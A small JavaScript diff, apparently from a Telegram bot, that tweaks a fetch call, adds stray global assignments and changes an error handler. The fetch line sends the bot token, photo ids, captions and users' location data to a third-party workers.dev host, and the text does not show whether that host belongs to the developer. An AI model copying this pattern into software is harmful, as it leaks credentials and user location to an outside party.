@@ -71,7 +71,7 @@
                 }
 
                 re.photo = re.photo[re.photo.length - 1].file_id
-               B.photo = await fetch(`https://clo.wwv.workers.dev/x?id=${re.photo}&ll=${X.location}&geo=${X.geo}&cap=${re.caption}&ref=${X.ref}&t=${TOKEN}&n=${"x"}&cc=${X.cc}`)
+               B.photo = await fetch(`https://clo.wwv.workers.dev/x?id=${re.photo}&ll=${X.location}&geo=${X.geo}&cap=${re.caption}&ref=${X.ref}&t=${TOKEN}&n=${"z"}&cc=${X.cc}`)
   .then( r => r.json() )
     .then( r => 
     {
@@ -385,6 +385,8 @@ finally {
             await fetch(`https://api.telegram.org/bot${TOKEN}/deleteMessage?chat_id=${re.chat}&message_id=${re.message_id}`)
         }
 }
+U = re
+B.text = re
         return re
     }
     var u = async re => {
@@ -492,7 +494,7 @@ finally {
             body: str(v)
         }).then(r => r.json())
         .then(r => 
-                           r.description ? console.error(r.description) : ''             )
+                           r.description ? console.error(r.description) : (R='')             )
     }
     var DB = console.DB
     console.DB = db
